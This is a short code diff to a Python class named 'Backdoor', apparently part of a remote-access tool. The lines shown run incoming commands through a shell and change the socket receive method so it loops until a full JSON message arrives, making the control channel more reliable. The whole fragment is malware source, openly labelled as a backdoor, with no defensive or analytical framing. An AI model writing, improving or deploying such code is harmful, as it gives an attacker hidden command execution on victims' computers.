@@ -16,8 +16,13 @@ class Backdoor:
         return subprocess.check_output(command, shell=True)
     
     def reliable_receive(self):
-        json_data = self.connection.recv(1024)
-        return json.loads(json_data)
+        json_data = ""
+        while True: #loop to execute until entire stream of data is received
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data) #attempt to unpack json converted TCP stream
+            except ValueError: #ValueError unterminated string will be received if entire data set is not received
+                continue
     
     def reliable_send(self, data):
         #seralise data being sent in order to make sure
